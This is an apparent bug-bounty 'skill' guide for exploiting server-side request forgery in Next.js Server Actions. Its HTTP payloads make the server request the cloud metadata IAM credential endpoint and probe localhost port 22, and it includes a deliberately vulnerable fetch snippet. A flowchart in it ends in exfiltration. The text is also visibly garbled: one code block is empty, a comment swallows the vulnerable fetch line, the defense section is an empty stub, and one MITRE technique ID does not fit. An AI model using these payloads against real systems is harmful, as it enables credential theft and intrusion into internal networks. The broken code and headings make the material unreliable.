---
name: ssrf-nextjs-server-actions
description: >
  Identify and exploit Server-Side Request Forgery (SSRF) vulnerabilities in Next.js 
  applications, specifically focusing on insecure server actions or API routes fetching 
  user-controlled URLs on the server-side.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0001, TA0040]
  techniques: [T1190, T1566]
platforms: [web, nextjs]
tags: [ssrf, nextjs, web-security, bug-hunting, server-actions, react]
tools: [burp-suite, custom-scripts]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# SSRF via Next.js Server Actions

## When to Use
- When auditing modern web applications built using Next.js (React framework) that utilize Server Actions or custom API routes (`/pages/api` or `/app/api`).
- To demonstrate how fetching external data based on user input on the server side can lead to SSRF, allowing access to internal networks or cloud metadata.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying Server Actions

```text
# Concept: Next.js Server Actions ```

### Phase 2: Analyzing Request Payloads (Black Box)

```http
# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "https://attacker.com/image.png"}]
```

### Phase 3: Code Review (White Box - if available)

```javascript
# Sink: fetch() 'use server'

export async function fetchPreview(url) {
  // VULNERABLE const res = await fetch(url);
  const data = await res.text();
  return { preview: data.substring(0, 100) };
}
```

### Phase 4: Exploitation

```http
# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}]

# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "http://127.0.0.1:22"}]
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Monitor Next-Action ] --> B{Accepts URL Input ]}
    B -->|Yes| C[Test internal ]
    B -->|No| D[Test parameter ]
    C --> E[Exfiltrate ]
```


## 🔵 Blue Team Detection & Defense
- **URL Allowlisting**: - **SSRF Protections (Network Level)**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Ssrf Nextjs Server Actions — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [SSRF](https://portswigger.net/web-security/ssrf)
- Next.js Security: [Server Actions Security](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations#security)
